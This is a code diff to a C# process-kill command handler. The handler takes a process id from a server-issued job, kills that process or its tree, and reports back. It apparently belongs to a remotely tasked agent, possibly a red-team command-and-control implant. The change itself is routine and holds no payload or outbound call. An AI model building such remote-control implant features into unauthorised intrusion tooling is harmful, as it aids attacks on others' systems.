@@ -1,10 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Text.Json;
 using System.Threading;
 using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
+using kill;
 
 namespace Agent
 {
@@ -20,8 +22,9 @@ namespace Agent
         }
         public async Task Execute(ServerJob job)
         {
-            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
-            if (!args.ContainsKey("id") || String.IsNullOrEmpty(args["id"].ToString()))
+            KillArgs args = JsonSerializer.Deserialize<KillArgs>(job.task.parameters);
+
+            if(args.id < 1)
             {
                 await messageManager.AddResponse(new ResponseResult
                 {
@@ -30,32 +33,14 @@ namespace Agent
                     task_id = job.task.id,
                     status = "error"
                 });
-
             }
-            else
-            {
-                try
-                {
-                    Process proc = Process.GetProcessById(int.Parse(job.task.id));
-                    proc.Kill();
 
-                    int i = 0;
-                    while (!proc.HasExited)
-                    {
-                        if (i == 30)
-                        {
-                            await messageManager.AddResponse(new ResponseResult
-                            {
-                                completed = true,
-                                user_output = "Process ID " + proc.Id + " did not exit in the alotted time.",
-                                task_id = job.task.id,
-                                status = "error"
-                            });
-                            return;
-                        }
-                        Thread.Sleep(1000);
-                        i++;
-                    }
+            try
+            {
+                using (var proc = Process.GetProcessById(args.id))
+                {
+                    proc.Kill(args.tree);
+                    await proc.WaitForExitAsync();
 
                     await messageManager.AddResponse(new ResponseResult
                     {
@@ -64,11 +49,11 @@ namespace Agent
                         task_id = job.task.id,
                     });
                 }
-                catch (Exception e)
-                {
-                    messageManager.Write(e.ToString(), job.task.id, true, "error");
-                    return;
-                }
+            }
+            catch (Exception e)
+            {
+                messageManager.Write(e.ToString(), job.task.id, true, "error");
+                return;
             }
         }
     }
